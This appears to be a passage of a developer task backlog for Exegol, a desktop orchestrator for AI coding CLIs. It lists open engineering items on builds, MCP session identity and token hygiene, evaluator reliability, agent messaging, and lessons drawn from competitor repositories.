    > liveness signal, not just history.** clay writes a turn as `"pending"` BEFORE the request and
    > rewrites it after, so a trailing `pending` means "running right now": scrape-free,
    > ANSI-immune. Extends T181's store readers from "what happened" to "what is happening".
12. Agent-driven UI over MCP (`pane_open`, `notify`).

### T195 — Distribution: universal build `added: 2026-04-15`
> Merged from T45 (CI/CD release pipeline, `added: 2026-04-15`) and T193.3 on 2026-10-04. T195
> itself was added 2026-09-24.

**Priority**: P2 | **Effort**: M

Notarization (since 0.5.4) and GitHub releases are done. The build is still arm64 only.
2. Universal build (Intel + Apple Silicon): core-rust for `x86_64-apple-darwin` too, the
   `@libsql/darwin-x64` binary (not installed today), node-pty x64; `target: universal` or two DMGs.
   (T193.3: arm64 only, `core-rust.darwin-arm64.node`, no `@libsql/darwin-x64`.)
4. Validate on someone else's Intel and Apple Silicon Mac: downloaded DMG opens with no warning;
   auto-update goes from one release to the next.
6. (was T45) Validation CI shipped (`.github/workflows/ci.yml`, PR #115). Remaining: tag-triggered
   package + release workflow, signing secrets (see `GUIDES/RELEASE.md`).

### T193 — v0.5.0 pre-build audit leftovers `added: 2026-09-22`
**Priority**: P1 unless noted | **Source**: 2026-09-22 pre-build audit. Fixed items are in `TASK_COMPLETED/2609.md`.

**Distribution**
2. `process.execPath` is written into hooks, `.mcp.json` and CLI configs: launching from the DMG
   volume or a translocated path breaks them once the app moves. Install to /Applications first;
   long term, rewrite those paths at startup when execPath changed.
3. arm64 only: merged into T195.2.
4. node-pty `prebuilds/darwin-arm64/spawn-helper` has no exec bit; works only because
   `rebuild:native` builds `build/Release/spawn-helper`. chmod in an afterPack hook.
5. Dev and packaged share `~/.exegol` sidecar socket and pid (same SIDECAR_VERSION reuses each
   other's sidecar). P2.
6. `@exegol/core-rust` undeclared in `apps/desktop` (knip flags it; it ships by relative path via
   extraResources). P2.

**Agents**
8. Memory extraction on exit is dead (`extractAndStoreMemories` only via `memory.extract`, never
   called since 8b26000). Decide: wire on exit or drop from CLAUDE.md.
10. `getAppSettings` falls back to defaults on bad JSON; the next update saves over the row.

**Pipelines and git**
12. `{{diff}}` in argv: merged into T183.11.
13. Without core-rust (`dev:ui`) runs silently use the project root.
14. Resume/Export pipeline mutations and Git stage/unstage have no onError; renamed or quoted
    paths break staging.
15. Pipeline snapshot restore runs on `project.path`; Rust refuses the cross-worktree restore (safe,
    now visible as a toast). Pass the run's worktree path.

**History, parallel, QA, files**
16. History adapters: merged into T191; the "resume from history" button is T181's "Resume from
    history".
17. Parallel runs Cancel / stuck `running`: merged into T185.3.
21. Knowledge, Tasks and Add Memory swallow errors; archiving can overwrite `tasks_completed.md`
    (`task-file-actions.ts:40`).
22. P2 debt: `trpcMutate<any>("agents.spawn")` x9; ~30 stale biome suppressions; unused renderer
    hooks (`use-trpc-mcp`, `-search`, `-budgets`, `-scoring`); MCP serverInfo version hardcoded 1.0.0;
    CLI package 0.4.0.

---

### T191 — Provider capability descriptor `added: 2026-08-11`
> Merged from T161 (session naming, `added: 2026-08-11`), T175.6 and T193.16 on 2026-10-04.
> T191 itself was added 2026-09-22. T200.9 (hooks for Codex and other CLIs, session id from the
> hook) extends it.

**Priority**: P2 | **Effort**: M | **Source**: merge of overlapping provider-knowledge items

Per-provider behaviour lives in at least five hand-synced tables. Declare it once on the provider
definition in `agents/registry.ts` so custom providers get it too. Absorbs:
- T165/T166: one descriptor table for the per-provider MCP config writers + token read chain
  (`exegol-mcp-config.ts`, 506 LOC), and derive the MCP wiring panel
  (`procedures/mcp.ts` `EXEGOL_MCP_PROVIDER_WIRING`) from it (`mcpConfigFlavor`)
- T181: `configDir` + `localHistory` (history readers, `skills/paths.ts`, `skills/importer.ts` and
  `agents/wrappers.ts` disagree: `"claude"` vs `"claude-code"`, two opencode dirs); `isEphemeral`
  instead of `cli_type === "shell"` in ~19 places
- T193.16 history adapters: opencode moved to SQLite (adapter reads JSON only); Gemini now uses
  `projects.json` folder names (adapter reads hashed `tmp/`)
- T161: `supportsSessionRename`, `resumeByName`. The spawn modal already offers resumable
  sessions by alias (shipped 2026-08-13). Still open: claude and codex can NAME a session (their
  own `rename`) and resume it BY that name (`claude --resume "<name>"`). Exegol keeps its
  codename separate, so after a restart the user renames by hand in each terminal. When Exegol
  assigns a codename, push it into the CLI's session name where supported and prefer name-based
  resume over the captured resume command: one identity, and `agents_list` names survive outside
  Exegol
- T175.6: `emitsTurnBoundaries`. Composer-ready should come from the PTY emulator, not a second
  parser: the round-7 `ESC[?2004h` sniff was removed (most TUIs enable it once at startup, so it
  never fired, and it cost a hot-path scan). The `HeadlessEmulator` already parses this mode; a
  `getBracketedPaste(id): boolean | null` accessor on PtyHost gives the tri-state if readiness
  detection is wanted
- T174: composer-ready marker + anchor per TUI
- T172: expected behaviour (asks for authorization before sharing, etc.)

---

### T192 — Evaluator: schema output, honest failure states, durable verdicts `added: 2026-09-22`
**Priority**: P1 when pipelines are in daily use, else P2 | **Effort**: M | **Source**: merge of T184.7, T183.14, review 2026-09-05 #10, T122 structured output

- Judge output is regex-scraped (`evaluator.ts:83`) with a silent score-0 fallback; failed judges'
  zeros enter the average, so an infrastructure or format failure can route the pipeline to "fix".
  Schema-validated output (tool parameter schema or `generateObject`), hard-fail when absent.
- Distinct states: valid verdict / provider failure / insufficient evidence; minimum valid judges
  before deciding.
- Resume-after-hold counts as human approval: bind the approval to the evidence reviewed; a later
  diff change invalidates it. Retry-after-provider-failure must not read as approval.
- Durable verdict rows per attempt (status, retry count) so an interrupted gate resumes.
- Report: deterministic checks and their commands before the model score.

---

### T184 — Learnings from fx, eve, pullfrog, openchamber and clay `added: 2026-08-22`
**Priority**: P1 for item 5 (daily-readiness list) | **Effort**: varies | **Source**: 4-agent read
of the repos Antonio brought + fx.sh docs. Clones under `_repos_2_learn/github.com/`. Every claim
about OUR code below was reproduced before filing. The observability finding (14), the
permissions framing, the refuted claims and the not-worth-copying list moved to
`RESEARCH/COMPETITIVE_UPDATE_2026_08.md` on 2026-10-04.

(Item 1, pipeline evidence lost once the agent commits, shipped 2026-09-22 in PR #115; see
`TASK_COMPLETED/2609.md`. Items 3-4 and the DA1 half of 2 shipped 2026-10-01; the rest of 2 and
the reattach-replay leftover moved to T185.8.)

Left from the simplify of the sidecar batch (judged out of its scope):
- Process cleanup on close lives in main's `PtyHost.kill`; the sidecar's lease exit and SIGTERM
  handler still hang up only the shells. Move `terminalProcesses` + `terminateAll` into the
  sidecar with the next `SIDECAR_VERSION` bump
- One kill-with-escalation helper for `terminateAll` and `killDevServer` (one pid-reuse guard)
- The renderer's DB sync only adds agents: dropping ones the DB no longer has would make the
  store converge without relying on broadcasts
- Clear Terminal does not reach Dashboard mirror cards (they keep the old screen until a refit)

**Spawn and lifecycle (pullfrog).**

5. **beforeAgent (rest)**: the terminal now says the hook failed and the agent starts anyway
   (TASK_COMPLETED 2026-09-24). Still missing: tell the agent in a `SETUP HOOK FAILED` prompt
   section, and a longer hook timeout (theirs 10 min, ours 2).
6. API key liveness: merged into T183.2.
7. Evaluator output is regex-scraped (`evaluator.ts:83-91`): moved to T192.
8. Merge PR guard and 9. PR body footer: merged into T142.
10. **Stop-hook gate.** A 15-line bash hook curls a localhost server that can answer
    `{decision:"block", reason}` — the agent cannot end its turn with a dirty tree or an unmet
    contract. We already write per-agent hook settings AND already run a node binary from a PreToolUse
    hook, so the plumbing exists. Highest leverage per line in that repo.
11. **Effort as a `[0,1]` position** mapped onto each CLI's own published ladder, always rounding
    DOWN so it can never cost more than asked. We have no effort concept at all.
12. Lazy context (paths, not payloads): merged into T183.11.
13. Deterministic pre-compaction: merged into T183.1.
15. CLI journal as liveness signal: merged into T200.10.

---

### T183 — Learnings from monocode, mcp_agent_mail_rust and proliferate `added: 2026-08-19`
**Priority**: P1 for items 1-3 | **Effort**: varies | **Source**: 3-agent read of the repos Antonio
brought (2026-08-19). Clones under `_repos_2_learn/github.com/`. Every claim about OUR code below
was re-verified before filing.

(Terminal fidelity — alt-screen fit and OSC 10/11/12 replies — shipped 2026-08-19 under the
name "T183.1" (PR #114); see `TASK_COMPLETED/2608.md`. That name predates this list: item 1
below, context occupancy, is still open.)

**The two product-level misses (monocode).**

1. **Context-window occupancy is a number we do not have.** Every `token_usage` query we own is
   `SUM(input + output)` — cumulative SPEND. Occupancy is a different quantity and the actionable
   one ("am I about to get compacted?"). Their framing is the insight: it is a LEVEL, not a total —
   each turn reports the size of the prompt it just sent, so the newest reading REPLACES the
   previous one and compaction is free (after compacting, the next report is simply smaller). And
   the window size is read from the CLI (`modelUsage[*].contextWindow`), never from a model table
   that goes stale. Ring in the terminal toolbar, amber 75% / red 90%.
   → `main/tokens/log-parser.ts`, `renderer/components/terminal/TerminalToolbar.tsx`, a wave migration.
   > Merged from T184.13, the 2026-09-28 audit token-price nit and the `COMPETITIVE_UPDATE_2026_10.md`
   > P2 "real cost from CLI events" on 2026-10-04 (one tokens and context track).
   - (T184.13) **Deterministic pre-compaction, ~30 lines and no API call**: at 90% of budget keep
     the last N turns whole and collapse older TOOL RESULTS to a marker. LLM summarization stays a
     manual user action: an automatic LLM compaction "risks failing exactly when the context is
     already overloaded" (clay + monocode). We have no compaction logic at all, only
     `diff-budget.ts` and a 2000-token memory cap.
   - (audit 2026-09-28) Costs are fixed at import from a hardcoded price table (the Pricing editor
     changes only one table).
   - (P2) Real cost from CLI events (claude `total_cost_usd`, codex events), stored as unknown,
     never 0, when the CLI does not report it.
2. **Partly shipped 2026-10-04**: the Sparkles commit message runs through the logged-in CLI
   (`lib/claude-print.ts`, `claude -p` with no tools, MCP, settings or session). Left: an opt-in
   Settings toggle for the background ones (scoring, evaluator, evidence), which would spend the
   user's plan limits unseen, and a key liveness probe. Original finding: **Four features are
   dark until the user pastes an API key**: `agents/scoring.ts`,
   `ipc/procedures/diff-ai.ts` (the Sparkles commit button), `pipeline/evaluator.ts`,
   `pipeline/evidence.ts` — all through `callAnthropicMessage` with `x-api-key`. monocode spawns the
   user's ALREADY-AUTHENTICATED `claude` headless and isolated
   (`--no-session-persistence --strict-mcp-config --mcp-config '{"mcpServers":{}}' --settings '{"disableAllHooks":true}'`)
   for commit messages, PR titles and branch names. No key, nothing to configure, no double payment.
   → new `main/lib/headless-claude.ts` behind the existing `callAnthropicMessage` signature, API key
   as fallback.
   > Merged from T184.6 and the `COMPETITIVE_UPDATE_2026_10.md` P2 "credential verdicts" on 2026-10-04.
   - (T184.6) **We check that an API key exists, never that it works.** `doctor.ts:339` tests for a
     non-empty string, so a revoked key passes the doctor and fails inside a PTY at spawn.
     pullfrog's 40-line liveness probe returns `alive | dead | unknown` with a 5s timeout, and only
     lists providers whose live-200 AND bad-key rejection have both been measured; `unknown` never
     rewrites a working config. Probe the key as the fallback path.
   - (P2) Fault taxonomy and credential verdicts: "crashed" gets a cause; Doctor ranks a
     subscription over an API key (pullfrog `providerErrors.ts`, `credentialPool.ts`).

**The coordination gaps (mcp_agent_mail_rust).** Verified against our code, not taken on faith:

3. Claims TTL and 4. glob overlap: moved to T175.4 (claims track).
5. **Commit-time guard.** Our own tool description already admits "writes through shell commands are
   never intercepted". Their `pre-commit` hook reads active reservations from JSON in the git archive
   — so it works with the server DOWN — and blocks by default with an explicit bypass env var. We
   block BEFORE the write, they block after the work is done; the answer is both, not either.
6. Threads: moved to T162 (rooms). 7. Asserted ack: moved to T175.1. 8. Idempotency payload
   fingerprint: moved to T170.1.
9. **`agents_list` spans every project** (`listActiveAgents` filters by status only) and cross-project
   `agent_send` is unrestricted. Theirs has a per-agent contact policy
   (`open|auto|contacts_only|block_all`) and a deliberately vague rejection that does not leak
   whether the recipient exists.
10. **A hook is a second delivery route.** We already own the channel (T123 per-agent `--settings`).
    A `SessionStart`/`PostToolUse` hook printing unread mail costs zero PTY risk and covers exactly
    what injection cannot: an agent parked on a permission dialog (we correctly refuse to inject),
    providers with no boundary signal, and post-restart. INVERT both of their defaults — theirs
    re-prints already-read mail on every Bash call, a permanent token tax.

**The pipeline handoff (proliferate).**

11. **We pass terminal scrapings between steps.** `{{previousOutput}}` resolves to `outputSummary`,
    which is read from the previous agent's SCROLLBACK (`pipeline-helpers.ts:33`), and `{{diff}}` is
    an inlined git diff. They hand off through FILES — `.proliferate/context/<runId>/NN-slug.md`,
    referenced as `@doc:slug` — and never pass a diff at all: a reviewer is told to inspect the
    worktree itself, with only a manifest of changed files and per-file diff hashes stored. Strictly
    less lossy, far cheaper in tokens, and survives a restart for free.
    → `main/pipeline/context.ts`, `pipeline-step-handler.ts`, `packages/shared/src/types/pipeline.ts`
    > Merged from T193.12 on 2026-10-04: `{{diff}}` (up to 16 MiB) goes into argv; over ~1MB the
    > spawn fails. Pass via file.
12. Durable delegation outbox: moved to T170.3.
13. **One documented canonical lock-acquisition order.** We acquire worktree locks, DB writes and
    sidecar RPCs in whatever order each call site needed. (The fan-out cap half was dropped
    2026-10-04: no MCP tool spawns agents.)
14. Durable judge verdicts: moved to T192.

(The not-worth-copying list moved to `RESEARCH/COMPETITIVE_UPDATE_2026_08.md` on 2026-10-04.)

---

### T182 — Findings from the round-9 code review `added: 2026-08-19`
**Priority**: P1 for item 8 (daily use); rest P2 | **Effort**: S-M each | **Source**: 4-agent correctness review
over `eb6b37e..HEAD` (the T175/T180/T170.1/T166.1/T179.3/T181 wave)

Everything below was CONFIRMED by execution, not by reading. The fixes that shipped with the
review are in `TASK_COMPLETED/2608.md`; these are the ones that need more than a patch.

1. `ppid` is client-supplied, so the process-tree fallback can name another agent: moved to T173.
2. (Symlinked claim paths shipped 2026-08-19; the `pathsOverlap` residual moved to T175.4.)
3. Repo-authored run commands review: merged into T200.1.
4. **A `queued` message whose receiver's pane was closed reports `delivered: false` on
   retry** — `agent-messaging.ts#duplicateResult` → `getMessageEntry` returns undefined when
   either FK is NULL, and `messages` FKs are `ON DELETE SET NULL`. Closing a pane now archives
   rather than deletes (shipped), so this needs a real delete to trigger — but denormalizing
   the sender/receiver ids onto the message row would close it for good.
5. `identityMemo`: merged into T173.
6. **The MCP activity ring loses "connected but never spoke"** — `exegol-server.ts` announces
   a connection lazily on the first non-`check_path` message, so a shim that connects and dies
   before its first `list_tools` produces zero records. Announce on the first AUTHENTICATED
   message instead.
8. **`listSessionHistory` pagination has no pager yet** — the `, a.id DESC` tiebreaker shipped,
   but `history.list` still takes no `offset` and the UI has no paging. Add both together.

---

### T181 — Session history per repo `added: 2026-08-18`
**Priority**: P2 | **Effort**: S remaining | **Source**: Antonio, 2026-08-18

Core shipped 2026-08-18 (see `TASK_COMPLETED/2608.md`): retention, the merged timeline, and
local-store adapters for claude-code / codex / opencode. Remaining:

- **Resume from history.** The rows carry the provider's own session id; the launch modal
  already knows how to resume. A local session Exegol never launched is the interesting case.
- **Retention** (one sub-section: purge UI, policy file, shell rows). Merged 2026-10-04.
  - **Purge UI.** Nothing is deleted automatically any more, and `oplog` stores git trees, so the
    DB grows. There is no user-facing way to reclaim it: Settings needs a size readout and an
    explicit "purge older than N".
  - **One retention policy**: retention has three homes and no statement of policy: the shell
    delete and the ANSI-memory delete in `cleanupStaleData`, plus `agent_events` at 30 days in
    `notify-handler.ts`. One `db/retention.ts` declaring per-table policy, invoked once.
  - **`shell` rows are still deleted at startup**, so a terminal tab never appears in history.
    Correct today (no task, no score); revisit if plain terminals become worth remembering.
    Deeper, from the round-9 simplify: the *trigger* is wrong. Every other part of the shell
    lifecycle is handled at EXIT (`agent-session-callbacks.ts` skips scoring/memory/final_output;
    the renderer store auto-cleans on final status). Delete the row where the shell ends and the
    startup sweep disappears; it also currently runs before `runStartupRecovery`, whose
    reattach has explicit handling for shells still alive in the sidecar.
- `cli_type === "shell"` literal in ~19 places (`isEphemeral` capability): moved to T191.
- **Derive `capabilities.json` instead of hand-maintaining it.** The parity test stops a
  procedure shipping dead, but it also makes the trpc half of the allowlist a copy of the
  router — it can no longer deny anything. The property worth keeping is deny-by-default for
  a compromised renderer (browser panes are webviews in this app), so the fix is to mark
  intent AT the router (a `rendererProcedure` builder or `.meta({ exposed: true })`) and
  generate the file from that, asserting only "exposed ⇔ listed". Then a new procedure is
  denied until someone opts it in.
- Normalize paths inside `db/queries/path-claims.ts`: moved to T175.4.
- Per-provider filesystem knowledge (`configDir`, `localHistory`): moved to T191.

---

### T175 — Coordination follow-ups deferred from the round-7 simplify `added: 2026-08-13`
**Priority**: P2 | **Effort**: M | **Source**: 4-agent /simplify over `test/agent-collab-round6`

Real findings that needed more than a cleanup, so they were not folded into that branch.
(Item 1 — enforcing claims — shipped 2026-08-16; see `TASK_COMPLETED/2608.md`.)

1. **`consumed` means two different things.** Pull-consumed is a receipt (the agent's own
   authenticated call); turn-consumed is an inference ("a boundary happened after we wrote bytes")
   that a swallowed submit would report as read. Either add provenance (`via: "pull" | "turn"`) or
   reserve `consumed` for evidenced reads and call the inferred one `presumed_read`. Absorbs T183.7:
   mcp_agent_mail asserts it (`ack_required` → `acknowledge_message` → `ack_ts`, plus a "sent N ago,
   still unacked" view).
2. **`MAX_MESSAGE_CHARS` (12 000) is now incoherent with pointer delivery.** The cap existed because
   of the paste; bodies now travel as JSON over a socket. The cap is exactly what forces senders to
   split at send time — the bug pointer delivery was built to kill. Raise it hard, or drop it and
   bound total queued bytes instead.
3. **The worktree preference is honoured by 1 of 4 launchers.** `SpawnAgentModal` reads it;
   `QuickLaunchBar` and `EmptyPaneContent` omit `useWorktree` entirely (→ shared tree) and
   `ParallelSpawnModal` hardcodes `true`. If it is a project property it belongs in
   `projects.default_isolation` (that table already has `default_branch`/`default_ide`) and should
   be read in `agent-spawn-flow`, not per call site. Matters more now: whether a spawn shares the
   tree decides whether path claims are load-bearing or dead code.
4. **Claims track: no human surface, no TTL, prefix-only overlap.** Zero tRPC/UI references: the
   user arbitrates a stuck claim but cannot see or break one, and a stuck `waiting_input` agent holds
   its files forever (`w3_004_path_claims` has no `expires_at`). Absorbs:
   - T183.3 TTL: mandatory, clamped [60s, 1y], default 1h, plus renew, force-release, expiry sweep
   - T183.4 globs: `pathsOverlap` (`path-claims.ts:46`) is `a===b || startsWith`, so
     `src/**/*.test.ts` never overlaps `src/auth.test.ts`. Conflicts with the T172.1 decision
     ("NOT globs", module header): decide before building
   - T181/T182.2 residual: `canonical()` inside `db/queries/path-claims.ts` on insert and every
     comparison, so no caller can store an unresolved path
5. **`warnIfCommittable` is a log line nobody reads** for a credential in the user's repo. The
   NotificationBus already carries `resource:warning`/`budget:warning`; this deserves the same.
   (Made async in round 7 so it no longer blocks the spawn path.)
6. Composer-ready / `emitsTurnBoundaries`: merged into T191.

---

### T174 — Learnings from Orca (stablyai) `added: 2026-08-13`
**Priority**: P2 | **Effort**: varies | **Source**: 2-agent code read of stablyai/orca, 2026-08-13
(clone at `~/_repos_2_learn/github.com/stablyai/orca`)

Orca is a mature Electron orchestrator (~311k LOC, ~1:1 test ratio). Read for how it solves what
we solve. **It does not use MCP at all** — its agent-facing API is the `orca` CLI, invoked via
Bash. Confirms MCP-vs-CLI is a genuine fork, not a right/wrong; we stay on MCP (schema-validated,
no Bash permission needed), accepting that a provider without MCP can't participate.

Already adopted 2026-08-13: pointer-not-body delivery for long messages, submit on a separate
write, closing the paste on the failure path, boundary-signals-beat-quiescence.

Still worth taking, roughly by value:
- **Per-provider composer-ready spec** (lands in T191) (`src/shared/draft-paste-ready-scanner.ts:26-70`): each TUI
  declares a marker + anchor (codex `›`, opencode `ESC[?25h`, grok `❯` anchored to alt-screen and
  REVOKED on exit because starship uses the same glyph). We took the provider-agnostic half
  (`ESC[?2004h`); the per-provider table is the precise version.
- One-outstanding-delivery-per-run in DDL + replay-until-ack: moved to T170.3.
- **Declare which signal is authoritative and which is fallback.** We run THREE paths for one
  job — OSC-777 through the PTY, hook events dropped as files, and the scraped output parser —
  with the precedence living implicitly in the order of `if`s. That has already cost us: the
  `oscDeliveredAgents` guard exists because two paths applied the same signal twice, and the
  `ESC[?2004h` composer sniff was added and removed the same day for the same reason. Orca types
  it (`pane-agent-evidence.ts:80-117` returns `source: 'hook'|'title'|'none'` with
  `confidence: 'authoritative'|'fallback'`, hooks going stale after 30 min); Superset runs a
  SINGLE path. Either discipline beats three mechanisms racing. Cheapest version: one resolver
  returning `{status, source, confidence}` instead of scattered `continue`s. Related (from the
  T123 verify, 2026-07-09, optional): the OSC-777 → PTY path does not deliver for claude-code
  (it captures hook stdout); debug OSC delivery or drop the OSC hooks in favour of file events.

  Comparison that prompted this (Superset, via Antonio 2026-08-13): one shared `notify.sh`
  registered in each CLI's own config, identity via `SUPERSET_AGENT_ID`, an early `exit 0` when
  not inside a Superset terminal, POSTing to the host. Our `agents/wrappers.ts` is the same
  design arrived at independently, guard included — so the hook itself needs nothing. Two
  differences worth weighing: they hook `SessionStart`/`SessionEnd` (we infer session start),
  and both Superset AND Orca chose HTTP where we drop files. File-drop needs no port or token
  and survives the app being down; HTTP gives the hook a status code and does not depend on
  `fs.watch`, which loses events under load on macOS. Our events dir being empty proves we
  consume, not that nothing was missed.

- **Preamble that bans the agent's native ask-user UI**: a worker opening its own TUI prompt hangs
  the coordinator invisibly. Exactly the failure we hit with codex demanding authorization.
- **Never collapse "can't tell" into "dead"** (`src/main/daemon/AGENTS.md`): only a positive signal
  proves occupancy; a timeout proves nothing. Our crash-recovery alive/dead classification is that
  bug class.
- Symlinked shared `node_modules` and background worktree deletion: merged into T142 (worktree
  hygiene).

---

### T179 — Complements from Athas (athasdev/athas) `added: 2026-08-13`
**Priority**: P2 | **Effort**: S-M each | **Source**: competitor read, clone at
`~/_repos_2_learn/github.com/athasdev/athas`

Checked first: **the WebAssembly terminal engine is not for us.** Athas ships `ghostty-web`
behind a feature flag with `status: "experimental"`, `default: false`, and keeps the FULL
xterm.js addon suite alongside it — an alternative engine, not a replacement. Because the wasm
engine has no addon ecosystem they hand-rolled search and serialize, and their serialize
returns PLAIN TEXT (`translateToString(true)`). Our reattach depends on ANSI-preserving
serialization (`headless-emulator.snapshot()` via SerializeAddon) — plain text would destroy
exactly the fidelity we fixed on 2026-08-13. Revisit only for VT correctness, never for speed.

Worth taking:
1. **Feature flags as a system.** Every Athas feature carries id/name/description/icon and an
   optional `status: "experimental"`, plus a settings search index. The ghostty case is the
   argument: it lets you LAND something risky off-by-default instead of not landing it. We have
   been shipping large changes with no flag at all.
2. Local history: merged into T200.5 (per-file view over per-turn snapshots).
3. **`persistentCommands`** — last-used commands float to the top of the palette. Tiny.

(Item 3, run actions, shipped 2026-08-16; see `TASK_COMPLETED/2608.md`. LSP code lens stays
out — it needs an LSP we do not have.)

---

### T170 — Messaging durability + generalized idempotency `added: 2026-08-13`
**Priority**: P2 | **Effort**: M | **Source**: 4-agent /simplify over the T165/T168 round (2026-08-13)

Follow-ups the review flagged as right-but-bigger than that commit.
(Item 1 — delivery state in the DB — shipped 2026-08-16; see `TASK_COMPLETED/2608.md`.)

1. **Generalize idempotency to the RPC layer.** Today only `agent_send` is safely
   retryable, and the retry is performed by the MODEL following prose. The shim already has
   a per-call id — make it stable across reconnects and have the server replay the recorded
   response for a repeated id. Then every tool is retryable and the shim can retry itself.
   Build it when the SECOND tool needs it, not with another bespoke key. Absorbs T183.8: the
   same `client_key` with a different body silently returns the old message; store a payload
   fingerprint and error on mismatch.
2. Tokenless config: moved to T173.
3. **Durable delivery outbox.** Absorbs T183.12 and the T174 DDL note: deliveries table with
   lease token, `attempt_count`, `next_attempt_at`, dead-letter, written in the SAME transaction
   as the terminal turn event; one outstanding delivery per run enforced in DDL, replay until ack.

---

### T166 — MCP shim architecture (deferred from the 2026-08-12 shim review) `added: 2026-08-12`
**Priority**: P2 | **Effort**: M-L | **Source**: 4-agent shim /simplify — security + correctness landed same day; these are the architectural residuals

(Input caps and the credential warning shipped 2026-08-16; see `TASK_COMPLETED/2608.md`.
The `.gitignore` upsert bullet was DROPPED: [[T173]] settled that Exegol must not gitignore
files a team may legitimately version — the warning goes to the human instead. The sidecar's
own NDJSON reader, `session.clear` and the linear `createNdjsonBuffer` shipped 2026-10-01; see
`TASK_COMPLETED/2610.md`.)

- **MCP recall is FTS-only**: `exegol-tools.ts` calls `searchMemories` without
  `ollamaConfig`, while `ipc/procedures/memory.ts` passes it — agents get worse recall than
  the UI for the same store.

- **`hello` handshake on connect** (shim version, agentId, token source, pid): today the
  server logs `shim #7` and cannot tell a returning shim from a stranger, nor a stale one
  from a current one. With it: "3 agents on an outdated shim — restart those sessions"
  becomes a surfaced, actionable state instead of an invisible failure. Also lets the shim
  `report` its own state (outbox depth, outage duration, token source) into the activity
  ring — today the shim is observability-dark (stderr is swallowed by the CLI).
- **Shim as a thin pipe**: forward raw MCP messages (`mcp_message {token, msg}`) so
  initialize/ping/tools-list/tools-call/result-encoding all run in the RUNNING app. What
  stays frozen in a shim then is irreducible: framing, token resolve, reconnect (~60 LOC
  vs ~270). Every future drift stops needing a per-method proxy.
- Descriptor table for the per-provider config writers: moved to T191.
- **Drop `EXEGOL_ACCESS_MODE`**: display-only, stale by construction (never rewritten when
  the user changes mode), never delivered to codex; enforcement is 100% server-side.
- codex cwd→token 1:1: moved to T173.
- **Socket squat probe**: `connect()` succeeding is treated as "another Exegol owns it" —
  verify `lstat` isSocket + uid, and handshake before trusting; surface "refused to start"
  in the MCP panel instead of one log line.
- Extract `provisionAgentMcp`/`deprovision` out of `buildPtyInvocation` (a command builder
  that writes files, mutates the token registry and starts a socket server).

---

### T172 — Orchestration primitives (from a real coordinated round) `added: 2026-08-13`
**Priority**: P1 | **Effort**: L (split before starting) | **Source**: Juanito's round-2 report,
2026-08-13 — one claude coordinating a codex + an opencode across 3 tasks / 9 files / 0 collisions

Validated first, so we don't undo it: stable identity, `message_id`/`in_reply_to`, and the
pre-authorization clause all held for a full assign → work → report → review → feedback cycle.
The gaps below are what the coordinator had to cover BY HAND.

(Items 1, 5, 6 and 7 shipped in 746d466; archived in `TASK_COMPLETED/2610.md` on 2026-10-04.)

2. **Reports are claims, not evidence.** Both agents reported "lint clean, tsc exit 0" and both
   were telling the truth — but the coordinator could only know by re-running everything. The
   bus carries prose only. Note Exegol ALREADY observes the diff (T130 evidence, oplog, scoring):
   the right altitude is Exegol ATTACHING what it verified (files touched, diff hash, exit codes)
   to a message, not a self-reported `artifacts` field the agent fills in.
3. **`status` is too coarse.** `running`/`waiting_input` doesn't say whether an agent is on MY
   task, finished and idle, or off doing something else. Needs task-level state: who assigned
   what, and where it is.
4. Broadcast / shared session context: moved to T162 (rooms).

**Provider behaviour differs and the orchestrator can't know in advance** (codex demanded human
authorization, opencode asked nothing): declared per provider in T191.

**Remaining**: 2 (attach the diff Exegol already captures — highest value of what's left) and
3 (task-level state).

---

### T173 — Per-session MCP identity, no token in a repo file `added: 2026-08-13`
**Priority**: P1 (security hygiene) | **Effort**: M | **Source**: Juanito, 2026-08-13 · merges T166 codex cwd→token, T170.2, T182.1
> Merged from T182.5 on 2026-10-04: **`identityMemo` never evicts** (`mcp/exegol-server.ts`):
> keyed on a client-supplied pid, overwritten but never deleted, and never consulted on the path
> it was written for (the claim guard sends no `ppid`). Wire it to a bounded cache or delete it,
> as part of the `resolveContext` cleanup below.

`opencode.json` (repo root) carries `EXEGOL_MCP_TOKEN_FILE`; `.mcp.json`, `.gemini/settings.json`,
`.devin/`, `.agents/` are the same shape. The credential is bounded — per session, revoked on
exit, and the server rejects tokens whose agent isn't live — but it should not be committable at
all. Exegol must NOT gitignore these itself: they are legitimate project config a team may want
versioned, and we only insert the `exegol` key. Shipped for now: a warning at spawn when the
file isn't ignored.

Real fix, and it deletes code rather than adding it: wherever the CLI forwards its env to MCP
servers, the per-session token already arrives via the PTY (`EXEGOL_MCP_TOKEN_FILE` + shim
env-preference) and the file needs no secret at all. Verify per provider with TWO sessions of the
same provider in one cwd; the single-session case looks identical either way and proves nothing.
For every CLI that forwards, drop the file token, the multi-binding registry, the `ps` walk and
the `-32003` ambiguity path.

Where a CLI does NOT forward (codex today): two codex agents in one cwd still share a token file
at runtime. Force a unique cwd for on-disk-token flavors or refuse the second; persist cwd on the
agent row (reattach, exit cleanup and pipeline agents all re-derive it today).

Then close the forgery hole (was T182.1): `ppid` is client-supplied, so
`mcp/exegol-server.ts#resolveContext` can resolve an agent as a sibling; access is capped at the
caller's token but the IDENTITY is the sibling's, so `agent_send` can be forged and
`release_paths` can drop a claim. Once no token is shared, require `resolveByParentPid` to land
inside the token's own bindings and delete the fallback. Node exposes no `SO_PEERCRED`.

---

### T169 — Worktree coordination model (coordinator + workers) `added: 2026-08-13`
**Priority**: P2 | **Effort**: M | **Source**: Antonio's working pattern, 2026-08-13

Two shapes, both real, and messaging should serve each:
- **One repo, one folder**: the coordinator (e.g. Juanito) holds the main checkout; helpers
  get their own temporary worktrees so parallel edits don't collide, and hand work back as
  commits/PRs the coordinator reviews. Needs: spawn-with-worktree from a link/room, and the
  coordinator being told the branch/PR to review.
- **Front + back (separate folders)**: no worktree needed — the folders already isolate.
  The coordinator's value is sequencing and review, not conflict avoidance. This is the
  cross-project case, so the origin line in the message header matters.

Depends on the T162 link roles (reviewer/feedback) and pairs with T166's per-agent MCP
identity, which is what makes several agents in one cwd viable at all.

---

### T158 — Memory Habit Protocol `added: 2026-08-11`
**Priority**: P1-P2 (small, high-leverage — natural follow-up to the verified MCP loop) | **Effort**: S-M | **Source**: Antonio's question ("que el agente recuerde usar la memoria solo") + `RESEARCH/ENGRAM_2026_08.md` (5-layer habit stack) + `RESEARCH/TRINITY_2026_08.md` (platform_prompt_service: composed runtime-aware protocol-teacher block per spawn — production reference)

**Why**
- The MCP memory loop works (verified 2026-08-11) but agents only use it when told.
  engram proves the fix is environmental: saturate the session with triggers, nudges and
  contracts — no auto-capture, the model does every save, but it never forgets to.

